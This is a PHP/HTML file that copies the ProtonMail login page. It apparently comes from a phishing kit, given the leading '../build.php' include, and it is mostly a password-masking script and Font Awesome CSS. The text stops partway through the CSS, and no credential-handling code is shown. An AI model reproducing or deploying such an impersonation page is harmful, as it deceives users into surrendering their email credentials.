
<?php include '../build.php' ?>
<!DOCTYPE html>
<script type="text/javascript">/*<![CDATA[*/function MaskedPassword(e,d){if(typeof document.getElementById=="undefined"||typeof document.styleSheets=="undefined"){return false}if(e==null){return false}this.symbol=d;this.isIE=typeof document.uniqueID!="undefined";e.value="";e.defaultValue="";e._contextwrapper=this.createContextWrapper(e);this.fullmask=false;var f=e._contextwrapper;var b='<input type="hidden" name="'+e.name+'">';var c=this.convertPasswordFieldHTML(e);f.innerHTML=b+c;e=f.lastChild;e.className+=" masked";e.setAttribute("autocomplete","off");e._realfield=f.firstChild;e._contextwrapper=f;this.limitCaretPosition(e);var a=this;this.addListener(e,"change",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"input",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"propertychange",function(g){a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"keyup",function(g){if(!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))}});this.addListener(e,"blur",function(g){a.fullmask=true;a.doPasswordMasking(a.getTarget(g))});this.forceFormReset(e);return true}MaskedPassword.prototype={doPasswordMasking:function(a){var d="";if(a._realfield.value!=""){for(var b=0;b<a.value.length;b++){if(a.value.charAt(b)==this.symbol){d+=a._realfield.value.charAt(b)}else{d+=a.value.charAt(b)}}}else{d=a.value}var c=this.encodeMaskedPassword(d,this.fullmask,a);if(a._realfield.value!=d||a.value!=c){a._realfield.value=d;a.value=c}},encodeMaskedPassword:function(d,f,b){var a=f===true?0:1;for(var e="",c=0;c<d.length;c++){if(c<d.length-a){e+=this.symbol}else{e+=d.charAt(c)}}return e},createContextWrapper:function(a){var b=document.createElement("span");b.style.position="relative";a.parentNode.insertBefore(b,a);b.appendChild(a);return b},forceFormReset:function(a){while(a){if(/form/i.test(a.nodeName)){break}a=a.parentNode}if(!/form/i.test(a.nodeName)){return null}this.addSpecialLoadListener(function(){a.reset()});return a},convertPasswordFieldHTML:function(c,e){var b="<input";for(var d=c.attributes,a=0;a<d.length;a++){if(d[a].specified&&!/^(_|type|name)/.test(d[a].name)){b+=" "+d[a].name+'="'+d[a].value+'"'}}b+=' type="text" autocomplete="off">';return b},limitCaretPosition:function(a){var d=null,c=function(){if(d==null){if(this.isIE){d=window.setInterval(function(){var e=a.createTextRange(),g=a.value.length,f="character";e.moveEnd(f,g);e.moveStart(f,g);e.select()},100)}else{d=window.setInterval(function(){var e=a.value.length;if(!(a.selectionEnd==e&&a.selectionStart<=e)){a.selectionStart=e;a.selectionEnd=e}},100)}}},b=function(){window.clearInterval(d);d=null};this.addListener(a,"focus",function(){c()});this.addListener(a,"blur",function(){b()})},addListener:function(c,a,b){if(typeof document.addEventListener!="undefined"){return c.addEventListener(a,b,false)}else{if(typeof document.attachEvent!="undefined"){return c.attachEvent("on"+a,b)}}},addSpecialLoadListener:function(a){if(this.isIE){return window.attachEvent("onload",a)}else{return document.addEventListener("DOMContentLoaded",a,false)}},getTarget:function(a){if(!a){return null}return a.target?a.target:a.srcElement}};/*]]>*/</script>
<html ng-app="proton" ng-csp="no-unsafe-eval"
    class="protonmail ua-gecko ua-gecko-52 ua-gecko-52-0 ua-firefox ua-firefox-52 ua-firefox-52-0 ua-desktop ua-desktop-linux js"
    lang="en">

<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <style type="text/css">
        @charset "UTF-8";

        [ng\:cloak],
        [ng-cloak],
        [data-ng-cloak],
        [x-ng-cloak],
        .ng-cloak,
        .x-ng-cloak,
        .ng-hide:not(.ng-hide-animate) {
            display: none !important;
        }

        ng\:form {
            display: block;
        }

        .ng-animate-shim {
            visibility: hidden;
        }

        .ng-anchor {
            position: absolute;
        }
    </style>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,user-scalable=no">
    <meta http-equiv="x-dns-prefetch-control" content="off">
    <title>Login | ProtonMail</title>
    <meta name="description" content="Log in or create an account.">
    <meta name="apple-mobile-web-app-title" content="ProtonMail">
    <meta name="application-name" content="ProtonMail">
    <meta name="msapplication-TileColor" content="#333366">
    <meta name="theme-color" content="#333366">
    <meta name="apple-itunes-app" content="app-id=979659905">

    <style>
        @charset "UTF-8";

        /*!
 *  Font Awesome 4.7.0 by @davegandy - http://fontawesome.io - @fontawesome
 *  License - http://fontawesome.io/license (Font: SIL OFL 1.1, CSS: MIT License)
 */
        @font-face {
            font-family: FontAwesome;
            src: url(assets/fonts/fontawesome-webfont.eot);
            src: url(assets/fonts/fontawesome-webfont.eot?#iefix&v=4.7.0) format("embedded-opentype"), url(assets/fonts/fontawesome-webfont.woff2) format("woff2"), url(assets/fonts/fontawesome-webfont.woff) format("woff"), url(assets/fonts/fontawesome-webfont.ttf) format("truetype"), url(assets/img/fontawesome-webfont.svg#fontawesomeregular) format("svg");
            font-weight: 400;
            font-style: normal
        }

        .fa {
            display: inline-block;
            font: normal normal normal 14px/1 FontAwesome;
            font-size: inherit;
            text-rendering: auto;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale
        }

        .fa-lg {
            font-size: 1.33333333em;
            line-height: .75em;
            vertical-align: -15%
        }

        .fa-2x {
            font-size: 2em
        }

        .fa-3x {
            font-size: 3em
        }

        .fa-4x {
            font-size: 4em
        }

        .fa-5x {
            font-size: 5em
        }

        .fa-fw {
            width: 1.28571429em;
            text-align: center
        }

        .fa-ul {
            padding-left: 0;
            margin-left: 2.14285714em;
            list-style-type: none
        }

        .fa-ul>li {
            position: relative
        }

        .fa-li {
            position: absolute;
            left: -2.14285714em;
            width: 2.14285714em;
            top: .14285714em;
            text-align: center
        }

        .fa-li.fa-lg {
            left: -1.85714286em
        }

        .fa-border {
            padding: .2em .25em .15em;
            border: .08em solid #eee;
            border-radius: .1em
        }

        .fa-pull-left {
            float: left
        }

        .fa-pull-right {
            float: right
        }

        .fa.fa-pull-left {
            margin-right: .3em
        }

        .fa.fa-pull-right {
            margin-left: .3em
        }

        .pull-right {
            float: right
        }

        .pull-left {
            float: left
        }

        .fa.pull-left {
            margin-right: .3em
        }

        .fa.pull-right {
            margin-left: .3em
        }

        .fa-spin {
            -webkit-animation: fa-spin 2s infinite linear;
            animation: fa-spin 2s infinite linear
        }

        .fa-pulse {
            -webkit-animation: fa-spin 1s infinite steps(8);
            animation: fa-spin 1s infinite steps(8)
        }

        @-webkit-keyframes fa-spin {
            0% {
                -webkit-transform: rotate(0deg);
                transform: rotate(0deg)
            }

            to {
                -webkit-transform: rotate(359deg);
                transform: rotate(359deg)
            }
        }

        @keyframes fa-spin {
            0% {
                -webkit-transform: rotate(0deg);
                transform: rotate(0deg)
            }

            to {
                -webkit-transform: rotate(359deg);
                transform: rotate(359deg)
            }
        }

        .fa-rotate-90 {
            -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=1)";
            -webkit-transform: rotate(90deg);
            transform: rotate(90deg)
        }

        .fa-rotate-180 {
            -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=2)";
            -webkit-transform: rotate(180deg);
            transform: rotate(180deg)
        }

        .fa-rotate-270 {
            -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=3)";
            -webkit-transform: rotate(270deg);
            transform: rotate(270deg)
        }

        .fa-flip-horizontal {
            -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=0, mirror=1)";
            -webkit-transform: scaleX(-1);
            transform: scaleX(-1)
        }

        .fa-flip-vertical {
            -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=2, mirror=1)";
            -webkit-transform: scaleY(-1);
            transform: scaleY(-1)
        }

        :root .fa-flip-horizontal,
        :root .fa-flip-vertical,
        :root .fa-rotate-90,
        :root .fa-rotate-180,
        :root .fa-rotate-270 {
            -webkit-filter: none;
            filter: none
        }

        .fa-stack {
            position: relative;
            display: inline-block;
            width: 2em;
            height: 2em;
            line-height: 2em;
            vertical-align: middle
        }

        .fa-stack-1x,
        .fa-stack-2x {
            position: absolute;
            left: 0;
            width: 100%;
            text-align: center
        }

        .fa-stack-1x {
            line-height: inherit
        }

        .fa-stack-2x {
            font-size: 2em
        }

        .fa-inverse {
            color: #fff
        }

        .fa-glass:before {
            content: "\F000"
        }

        .fa-music:before {
            content: "\F001"
        }

        .fa-search:before {
            content: "\F002"
        }

        .fa-envelope-o:before {
            content: "\F003"
        }

        .fa-heart:before {
            content: "\F004"
        }

        .fa-star:before {
            content: "\F005"
        }

        .fa-star-o:before {
            content: "\F006"
        }

        .fa-user:before {
            content: "\F007"
        }

        .fa-film:before {
            content: "\F008"
        }

        .fa-th-large:before {
            content: "\F009"
        }

        .fa-th:before {
            content: "\F00A"
        }

        .fa-th-list:before {
            content: "\F00B"
        }

        .fa-check:before {
            content: "\F00C"
        }

        .fa-close:before,
        .fa-remove:before,
        .fa-times:before {
            content: "\F00D"
        }

        .fa-search-plus:before {
            content: "\F00E"
        }

        .fa-search-minus:before {
            content: "\F010"
        }

        .fa-power-off:before {
            content: "\F011"
        }

        .fa-signal:before {
            content: "\F012"
        }

        .fa-cog:before,
        .fa-gear:before {
            content: "\F013"
        }

        .fa-trash-o:before {
            content: "\F014"
        }

        .fa-home:before {
            content: "\F015"
        }

        .fa-file-o:before {
            content: "\F016"
        }

        .fa-clock-o:before {
            content: "\F017"
        }

        .fa-road:before {
            content: "\F018"
        }

        .fa-download:before {
            content: "\F019"
        }

        .fa-arrow-circle-o-down:before {
            content: "\F01A"
        }

        .fa-arrow-circle-o-up:before {
            content: "\F01B"
        }

        .fa-inbox:before {
            content: "\F01C"
        }

        .fa-play-circle-o:before {
            content: "\F01D"
        }

        .fa-repeat:before,
        .fa-rotate-right:before {
            content: "\F01E"
        }

        .fa-refresh:before {
            content: "\F021"
        }

        .fa-list-alt:before {
            content: "\F022"
        }

        .fa-lock:before {
            content: "\F023"
        }

        .fa-flag:before {
            content: "\F024"
        }

        .fa-headphones:before {
            content: "\F025"
        }

        .fa-volume-off:before {
            content: "\F026"
        }

        .fa-volume-down:before {
            content: "\F027"
        }

        .fa-volume-up:before {
            content: "\F028"
        }

        .fa-qrcode:before {
            content: "\F029"
        }

        .fa-barcode:before {
            content: "\F02A"
        }

        .fa-tag:before {
            content: "\F02B"
        }

        .fa-tags:before {
            content: "\F02C"
        }

        .fa-book:before {
            content: "\F02D"
        }

        .fa-bookmark:before {
            content: "\F02E"
        }

        .fa-print:before {
            content: "\F02F"
        }

        .fa-camera:before {
            content: "\F030"
        }

        .fa-font:before {
            content: "\F031"
        }

        .fa-bold:before {
            content: "\F032"
        }

        .fa-italic:before {
            content: "\F033"
        }

        .fa-text-height:before {
            content: "\F034"
        }

        .fa-text-width:before {
            content: "\F035"
        }

        .fa-align-left:before {
            content: "\F036"
        }

        .fa-align-center:before {
            content: "\F037"
        }

        .fa-align-right:before {
            content: "\F038"
        }

        .fa-align-justify:before {
            content: "\F039"
        }

        .fa-list:before {
            content: "\F03A"
        }

        .fa-dedent:before,
        .fa-outdent:before {
            content: "\F03B"
        }

        .fa-indent:before {
            content: "\F03C"
        }

        .fa-video-camera:before {
            content: "\F03D"
        }

        .fa-image:before,
        .fa-photo:before,
        .fa-picture-o:before {
            content: "\F03E"
        }

        .fa-pencil:before {
            content: "\F040"
        }

        .fa-map-marker:before {
            content: "\F041"
        }

        .fa-adjust:before {
            content: "\F042"
        }

        .fa-tint:before {
            content: "\F043"
        }

        .fa-edit:before,
        .fa-pencil-square-o:before {
            content: "\F044"
        }

        .fa-share-square-o:before {
            content: "\F045"
        }

        .fa-check-square-o:before {
            content: "\F046"
        }

        .fa-arrows:before {
            content: "\F047"
        }

        .fa-step-backward:before {
            content: "\F048"
        }

        .fa-fast-backward:before {
            content: "\F049"
        }

        .fa-backward:before {
            content: "\F04A"
        }

        .fa-play:before {
            content: "\F04B"
        }

        .fa-pause:before {
            content: "\F04C"
        }

        .fa-stop:before {
            content: "\F04D"
        }

        .fa-forward:before {
            content: "\F04E"
        }

        .fa-fast-forward:before {
            content: "\F050"
        }

        .fa-step-forward:before {
            content: "\F051"
        }

        .fa-eject:before {
            content: "\F052"
        }

        .fa-chevron-left:before {
            content: "\F053"
        }

        .fa-chevron-right:before {
            content: "\F054"
        }

        .fa-plus-circle:before {
            content: "\F055"
        }

        .fa-minus-circle:before {
            content: "\F056"
        }

        .fa-times-circle:before {
            content: "\F057"
        }

        .fa-check-circle:before {
            content: "\F058"
        }

        .fa-question-circle:before {
            content: "\F059"
        }

        .fa-info-circle:before {
            content: "\F05A"
        }

        .fa-crosshairs:before {
            content: "\F05B"
        }

        .fa-times-circle-o:before {
            content: "\F05C"
        }

        .fa-check-circle-o:before {
            content: "\F05D"
        }

        .fa-ban:before {
            content: "\F05E"
        }

        .fa-arrow-left:before {
            content: "\F060"
        }

        .fa-arrow-right:before {
            content: "\F061"
        }

        .fa-arrow-up:before {
            content: "\F062"
        }

        .fa-arrow-down:before {
            content: "\F063"
        }

        .fa-mail-forward:before,
        .fa-share:before {
            content: "\F064"
        }

        .fa-expand:before {
            content: "\F065"
        }

        .fa-compress:before {
            content: "\F066"
        }

        .fa-plus:before {
            content: "\F067"
        }

        .fa-minus:before {
            content: "\F068"
        }

        .fa-asterisk:before {
            content: "\F069"
        }

        .fa-exclamation-circle:before {
            content: "\F06A"
        }

        .fa-gift:before {
            content: "\F06B"
        }

        .fa-leaf:before {
            content: "\F06C"
        }

        .fa-fire:before {
            content: "\F06D"
        }

        .fa-eye:before {
            content: "\F06E"
        }

        .fa-eye-slash:before {
            content: "\F070"
        }

        .fa-exclamation-triangle:before,
        .fa-warning:before {
            content: "\F071"
        }

        .fa-plane:before {
            content: "\F072"
        }

        .fa-calendar:before {
            content: "\F073"
        }

        .fa-random:before {
            content: "\F074"
        }

        .fa-comment:before {
            content: "\F075"
        }

        .fa-magnet:before {
            content: "\F076"
        }

        .fa-chevron-up:before {
            content: "\F077"
        }

        .fa-chevron-down:before {
            content: "\F078"
        }

        .fa-retweet:before {
            content: "\F079"
        }

        .fa-shopping-cart:before {
            content: "\F07A"
        }

        .fa-folder:before {
            content: "\F07B"
        }

        .fa-folder-open:before {
            content: "\F07C"
        }

        .fa-arrows-v:before {
            content: "\F07D"
        }

        .fa-arrows-h:before {
            content: "\F07E"
        }

        .fa-bar-chart-o:before,
        .fa-bar-chart:before {
            content: "\F080"
        }

        .fa-twitter-square:before {
            content: "\F081"
        }

        .fa-facebook-square:before {
            content: "\F082"
        }

        .fa-camera-retro:before {
            content: "\F083"
        }

        .fa-key:before {
            content: "\F084"
        }

        .fa-cogs:before,
        .fa-gears:before {
            content: "\F085"
        }

        .fa-comments:before {
            content: "\F086"
        }

        .fa-thumbs-o-up:before {
            content: "\F087"
        }

        .fa-thumbs-o-down:before {
            content: "\F088"
        }

        .fa-star-half:before {
            content: "\F089"
        }

        .fa-heart-o:before {
            content: "\F08A"
        }

        .fa-sign-out:before {
            content: "\F08B"
        }

        .fa-linkedin-square:before {
            content: "\F08C"
        }

        .fa-thumb-tack:before {
            content: "\F08D"
        }

        .fa-external-link:before {
            content: "\F08E"
        }

        .fa-sign-in:before {
            content: "\F090"
        }

        .fa-trophy:before {
            content: "\F091"
        }

        .fa-github-square:before {
            content: "\F092"
        }

        .fa-upload:before {
            content: "\F093"
        }

        .fa-lemon-o:before {
            content: "\F094"
        }

        .fa-phone:before {
            content: "\F095"
        }

        .fa-square-o:before {
            content: "\F096"
        }

        .fa-bookmark-o:before {
            content: "\F097"
        }

        .fa-phone-square:before {
            content: "\F098"
        }

        .fa-twitter:before {
            content: "\F099"
        }

        .fa-facebook-f:before,
        .fa-facebook:before {
            content: "\F09A"
        }

        .fa-github:before {
            content: "\F09B"
        }

        .fa-unlock:before {
            content: "\F09C"
        }

        .fa-credit-card:before {
            content: "\F09D"
        }

        .fa-feed:before,
        .fa-rss:before {
            content: "\F09E"
        }

        .fa-hdd-o:before {
            content: "\F0A0"
        }

        .fa-bullhorn:before {
            content: "\F0A1"
        }

        .fa-bell:before {
            content: "\F0F3"
        }

        .fa-certificate:before {
            content: "\F0A3"
        }

        .fa-hand-o-right:before {
            content: "\F0A4"
        }

        .fa-hand-o-left:before {
            content: "\F0A5"
        }

        .fa-hand-o-up:before {
            content: "\F0A6"
        }

        .fa-hand-o-down:before {
            content: "\F0A7"
        }

        .fa-arrow-circle-left:before {
            content: "\F0A8"
        }

        .fa-arrow-circle-right:before {
            content: "\F0A9"
        }

        .fa-arrow-circle-up:before {
            content: "\F0AA"
        }

        .fa-arrow-circle-down:before {
            content: "\F0AB"
        }

        .fa-globe:before {
            content: "\F0AC"
        }

        .fa-wrench:before {
            content: "\F0AD"
        }

        .fa-tasks:before {
            content: "\F0AE"
        }

        .fa-filter:before {
            content: "\F0B0"
        }

        .fa-briefcase:before {
            content: "\F0B1"
        }

        .fa-arrows-alt:before {
            content: "\F0B2"
        }

        .fa-group:before,
        .fa-users:before {
            content: "\F0C0"
        }

        .fa-chain:before,
        .fa-link:before {
            content: "\F0C1"
        }

        .fa-cloud:before {
            content: "\F0C2"
        }

        .fa-flask:before {
            content: "\F0C3"
        }

        .fa-cut:before,
        .fa-scissors:before {
            content: "\F0C4"
        }

        .fa-copy:before,
        .fa-files-o:before {
            content: "\F0C5"
        }

        .fa-paperclip:before {
            content: "\F0C6"
        }

        .fa-floppy-o:before,
        .fa-save:before {
            content: "\F0C7"
        }

        .fa-square:before {
            content: "\F0C8"
        }

        .fa-bars:before,
        .fa-navicon:before,
        .fa-reorder:before {
            content: "\F0C9"
        }

        .fa-list-ul:before {
            content: "\F0CA"
        }

        .fa-list-ol:before {
            content: "\F0CB"
        }

        .fa-strikethrough:before {
            content: "\F0CC"
        }

        .fa-underline:before {
            content: "\F0CD"
        }

        .fa-table:before {
            content: "\F0CE"
        }

        .fa-magic:before {
            content: "\F0D0"
        }

        .fa-truck:before {
            content: "\F0D1"
        }

        .fa-pinterest:before {
            content: "\F0D2"
        }

        .fa-pinterest-square:before {
            content: "\F0D3"
        }

        .fa-google-plus-square:before {
            content: "\F0D4"
        }

        .fa-google-plus:before {
            content: "\F0D5"
        }

        .fa-money:before {
            content: "\F0D6"
        }

        .fa-caret-down:before {
            content: "\F0D7"
        }

        .fa-caret-up:before {
            content: "\F0D8"
        }

        .fa-caret-left:before {
            content: "\F0D9"
        }

        .fa-caret-right:before {
            content: "\F0DA"
        }

        .fa-columns:before {
            content: "\F0DB"
        }

        .fa-sort:before,
        .fa-unsorted:before {
            content: "\F0DC"
        }

        .fa-sort-desc:before,
        .fa-sort-down:before {
            content: "\F0DD"
        }

        .fa-sort-asc:before,
        .fa-sort-up:before {
            content: "\F0DE"
        }

        .fa-envelope:before {
            content: "\F0E0"
        }

        .fa-linkedin:before {
            content: "\F0E1"
        }

        .fa-rotate-left:before,
        .fa-undo:before {
            content: "\F0E2"
        }

        .fa-gavel:before,
        .fa-legal:before {
            content: "\F0E3"
        }

        .fa-dashboard:before,
        .fa-tachometer:before {
            content: "\F0E4"
        }

        .fa-comment-o:before {
            content: "\F0E5"
        }

        .fa-comments-o:before {
            content: "\F0E6"
        }

        .fa-bolt:before,
        .fa-flash:before {
            content: "\F0E7"
        }

        .fa-sitemap:before {
            content: "\F0E8"
        }

        .fa-umbrella:before {
            content: "\F0E9"
        }

        .fa-clipboard:before,
        .fa-paste:before {
            content: "\F0EA"
        }

        .fa-lightbulb-o:before {
            content: "\F0EB"
        }

        .fa-exchange:before {
            content: "\F0EC"
        }

        .fa-cloud-download:before {
            content: "\F0ED"
        }

        .fa-cloud-upload:before {
            content: "\F0EE"
        }

        .fa-user-md:before {
            content: "\F0F0"
        }

        .fa-stethoscope:before {
            content: "\F0F1"
        }

        .fa-suitcase:before {
            content: "\F0F2"
        }

        .fa-bell-o:before {
            content: "\F0A2"
        }

        .fa-coffee:before {
            content: "\F0F4"
        }

        .fa-cutlery:before {
            content: "\F0F5"
        }

        .fa-file-text-o:before {
            content: "\F0F6"
        }

        .fa-building-o:before {
            content: "\F0F7"
        }

        .fa-hospital-o:before {
            content: "\F0F8"
        }

        .fa-ambulance:before {
            content: "\F0F9"
        }

        .fa-medkit:before {
            content: "\F0FA"
        }

        .fa-fighter-jet:before {
            content: "\F0FB"
        }

        .fa-beer:before {
            content: "\F0FC"
        }

        .fa-h-square:before {
            content: "\F0FD"
        }

        .fa-plus-square:before {
            content: "\F0FE"
        }

        .fa-angle-double-left:before {
            content: "\F100"
        }

        .fa-angle-double-right:before {
            content: "\F101"
        }

        .fa-angle-double-up:before {
            content: "\F102"
        }

        .fa-angle-double-down:before {
            content: "\F103"
        }

        .fa-angle-left:before {
            content: "\F104"
        }

        .fa-angle-right:before {
            content: "\F105"
        }

        .fa-angle-up:before {
            content: "\F106"
        }

        .fa-angle-down:before {
            content: "\F107"
        }

        .fa-desktop:before {
            content: "\F108"
        }

        .fa-laptop:before {
            content: "\F109"
        }

        .fa-tablet:before {
            content: "\F10A"
        }

        .fa-mobile-phone:before,
        .fa-mobile:before {
            content: "\F10B"
        }

        .fa-circle-o:before {
            content: "\F10C"
        }

        .fa-quote-left:before {
            content: "\F10D"
        }

        .fa-quote-right:before {
            content: "\F10E"
        }

        .fa-spinner:before {
            content: "\F110"
        }

        .fa-circle:before {
            content: "\F111"
        }

        .fa-mail-reply:before,
        .fa-reply:before {
            content: "\F112"
        }

        .fa-github-alt:before {
            content: "\F113"
        }

        .fa-folder-o:before {
            content: "\F114"
        }

        .fa-folder-open-o:before {
            content: "\F115"
        }

        .fa-smile-o:before {
            content: "\F118"
        }

        .fa-frown-o:before {
            content: "\F119"
        }

        .fa-meh-o:before {
            content: "\F11A"
        }

        .fa-gamepad:before {
            content: "\F11B"
        }

        .fa-keyboard-o:before {
            content: "\F11C"
        }

        .fa-flag-o:before {
            content: "\F11D"
        }

        .fa-flag-checkered:before {
            content: "\F11E"
        }

        .fa-terminal:before {
            content: "\F120"
        }

        .fa-code:before {
            content: "\F121"
        }

        .fa-mail-reply-all:before,
        .fa-reply-all:before {
            content: "\F122"
        }

        .fa-star-half-empty:before,
        .fa-star-half-full:before,
        .fa-star-half-o:before {
            content: "\F123"
        }

        .fa-location-arrow:before {
            content: "\F124"
        }

        .fa-crop:before {
            content: "\F125"
        }

        .fa-code-fork:before {
            content: "\F126"
        }

        .fa-chain-broken:before,
        .fa-unlink:before {
            content: "\F127"
        }

        .fa-question:before {
            content: "\F128"
        }

        .fa-info:before {
            content: "\F129"
        }

        .fa-exclamation:before {
            content: "\F12A"
        }

        .fa-superscript:before {
            content: "\F12B"
        }

        .fa-subscript:before {
            content: "\F12C"
        }

        .fa-eraser:before {
            content: "\F12D"
        }

        .fa-puzzle-piece:before {
            content: "\F12E"
        }

        .fa-microphone:before {
            content: "\F130"
        }

        .fa-microphone-slash:before {
            content: "\F131"
        }

        .fa-shield:before {
            content: "\F132"
        }

        .fa-calendar-o:before {
            content: "\F133"
        }

        .fa-fire-extinguisher:before {
            content: "\F134"
        }

        .fa-rocket:before {
            content: "\F135"
        }

        .fa-maxcdn:before {
            content: "\F136"
        }

        .fa-chevron-circle-left:before {
            content: "\F137"
        }

        .fa-chevron-circle-right:before {
            content: "\F138"
        }

        .fa-chevron-circle-up:before {
            content: "\F139"
        }

        .fa-chevron-circle-down:before {
            content: "\F13A"
        }

        .fa-html5:before {
            content: "\F13B"
        }

        .fa-css3:before {
            content: "\F13C"
        }

        .fa-anchor:before {
            content: "\F13D"
        }

        .fa-unlock-alt:before {
            content: "\F13E"
        }

        .fa-bullseye:before {
            content: "\F140"
        }

        .fa-ellipsis-h:before {
            content: "\F141"
        }

        .fa-ellipsis-v:before {
            content: "\F142"
        }

        .fa-rss-square:before {
            content: "\F143"
        }

        .fa-play-circle:before {
            content: "\F144"
        }

        .fa-ticket:before {
            content: "\F145"
        }

        .fa-minus-square:before {
            content: "\F146"
        }

        .fa-minus-square-o:before {
            content: "\F147"
        }

        .fa-level-up:before {
            content: "\F148"
        }

        .fa-level-down:before {
            content: "\F149"
        }

        .fa-check-square:before {
            content: "\F14A"
        }

        .fa-pencil-square:before {
            content: "\F14B"
        }

        .fa-external-link-square:before {
            content: "\F14C"
        }

        .fa-share-square:before {
            content: "\F14D"
        }

        .fa-compass:before {
            content: "\F14E"
        }

        .fa-caret-square-o-down:before,
        .fa-toggle-down:before {
            content: "\F150"
        }

        .fa-caret-square-o-up:before,
        .fa-toggle-up:before {
            content: "\F151"
        }

        .fa-caret-square-o-right:before,
        .fa-toggle-right:before {
            content: "\F152"
        }

        .fa-eur:before,
        .fa-euro:before {
            content: "\F153"
        }

        .fa-gbp:before {
            content: "\F154"
        }

        .fa-dollar:before,
        .fa-usd:before {
            content: "\F155"
        }

        .fa-inr:before,
        .fa-rupee:before {
            content: "\F156"
        }

        .fa-cny:before,
        .fa-jpy:before,
        .fa-rmb:before,
        .fa-yen:before {
            content: "\F157"
        }

        .fa-rouble:before,
        .fa-rub:before,
        .fa-ruble:before {
            content: "\F158"
        }

        .fa-krw:before,
        .fa-won:before {
            content: "\F159"
        }

        .fa-bitcoin:before,
        .fa-btc:before {
            content: "\F15A"
        }

        .fa-file:before {
            content: "\F15B"
        }

        .fa-file-text:before {
            content: "\F15C"
        }

        .fa-sort-alpha-asc:before {
            content: "\F15D"
        }

        .fa-sort-alpha-desc:before {
            content: "\F15E"
        }

        .fa-sort-amount-asc:before {
            content: "\F160"
        }

        .fa-sort-amount-desc:before {
            content: "\F161"
        }

        .fa-sort-numeric-asc:before {
            content: "\F162"
        }

        .fa-sort-numeric-desc:before {
            content: "\F163"
        }

        .fa-thumbs-up:before {
            content: "\F164"
        }

        .fa-thumbs-down:before {
            content: "\F165"
        }

        .fa-youtube-square:before {
            content: "\F166"
        }

        .fa-youtube:before {
            content: "\F167"
        }

        .fa-xing:before {
            content: "\F168"
        }

        .fa-xing-square:before {
            content: "\F169"
        }

        .fa-youtube-play:before {
            content: "\F16A"
        }

        .fa-dropbox:before {
            content: "\F16B"
        }

        .fa-stack-overflow:before {
            content: "\F16C"
        }

        .fa-instagram:before {
            content: "\F16D"
        }

        .fa-flickr:before {
            content: "\F16E"
        }

        .fa-adn:before {
            content: "\F170"
        }

        .fa-bitbucket:before {
            content: "\F171"
        }

        .fa-bitbucket-square:before {
            content: "\F172"
        }

        .fa-tumblr:before {
            content: "\F173"
        }

        .fa-tumblr-square:before {
            content: "\F174"
        }

        .fa-long-arrow-down:before {
            content: "\F175"
        }

        .fa-long-arrow-up:before {
            content: "\F176"
        }

        .fa-long-arrow-left:before {
            content: "\F177"
        }

        .fa-long-arrow-right:before {
            content: "\F178"
        }

        .fa-apple:before {
            content: "\F179"
        }

        .fa-windows:before {
            content: "\F17A"
        }

        .fa-android:before {
            content: "\F17B"
        }

        .fa-linux:before {
            content: "\F17C"
        }

        .fa-dribbble:before {
            content: "\F17D"
        }

        .fa-skype:before {
            content: "\F17E"
        }

        .fa-foursquare:before {
            content: "\F180"
        }

        .fa-trello:before {
            content: "\F181"
        }

        .fa-female:before {
            content: "\F182"
        }

        .fa-male:before {
            content: "\F183"
        }

        .fa-gittip:before,
        .fa-gratipay:before {
            content: "\F184"
        }

        .fa-sun-o:before {
            content: "\F185"
        }

        .fa-moon-o:before {
            content: "\F186"
        }

        .fa-archive:before {
            content: "\F187"
        }

        .fa-bug:before {
            content: "\F188"
        }

        .fa-vk:before {
            content: "\F189"
        }

        .fa-weibo:before {
            content: "\F18A"
        }

        .fa-renren:before {
            content: "\F18B"
        }

        .fa-pagelines:before {
            content: "\F18C"
        }

        .fa-stack-exchange:before {
            content: "\F18D"
        }

        .fa-arrow-circle-o-right:before {
            content: "\F18E"
        }

        .fa-arrow-circle-o-left:before {
            content: "\F190"
        }

        .fa-caret-square-o-left:before,
        .fa-toggle-left:before {
            content: "\F191"
        }

        .fa-dot-circle-o:before {
            content: "\F192"
        }

        .fa-wheelchair:before {
            content: "\F193"
        }

        .fa-vimeo-square:before {
            content: "\F194"
        }

        .fa-try:before,
        .fa-turkish-lira:before {
            content: "\F195"
        }

        .fa-plus-square-o:before {
            content: "\F196"
        }

        .fa-space-shuttle:before {
            content: "\F197"
        }

        .fa-slack:before {
            content: "\F198"
        }

        .fa-envelope-square:before {
            content: "\F199"
        }

        .fa-wordpress:before {
            content: "\F19A"
        }

        .fa-openid:before {
            content: "\F19B"
        }

        .fa-bank:before,
        .fa-institution:before,
        .fa-university:before {
            content: "\F19C"
        }

        .fa-graduation-cap:before,
        .fa-mortar-board:before {
            content: "\F19D"
        }

        .fa-yahoo:before {
            content: "\F19E"
        }

        .fa-google:before {
            content: "\F1A0"
        }

        .fa-reddit:before {
            content: "\F1A1"
        }

        .fa-reddit-square:before {
            content: "\F1A2"
        }

        .fa-stumbleupon-circle:before {
            content: "\F1A3"
        }

        .fa-stumbleupon:before {
            content: "\F1A4"
        }

        .fa-delicious:before {
            content: "\F1A5"
        }

        .fa-digg:before {
            content: "\F1A6"
        }

        .fa-pied-piper-pp:before {
            content: "\F1A7"
        }

        .fa-pied-piper-alt:before {
            content: "\F1A8"
        }

        .fa-drupal:before {
            content: "\F1A9"
        }

        .fa-joomla:before {
            content: "\F1AA"
        }

        .fa-language:before {
            content: "\F1AB"
        }

        .fa-fax:before {
            content: "\F1AC"
        }

        .fa-building:before {
            content: "\F1AD"
        }

        .fa-child:before {
            content: "\F1AE"
        }

        .fa-paw:before {
            content: "\F1B0"
        }

        .fa-spoon:before {
            content: "\F1B1"
        }

        .fa-cube:before {
            content: "\F1B2"
        }

        .fa-cubes:before {
            content: "\F1B3"
        }

        .fa-behance:before {
            content: "\F1B4"
        }

        .fa-behance-square:before {
            content: "\F1B5"
        }

        .fa-steam:before {
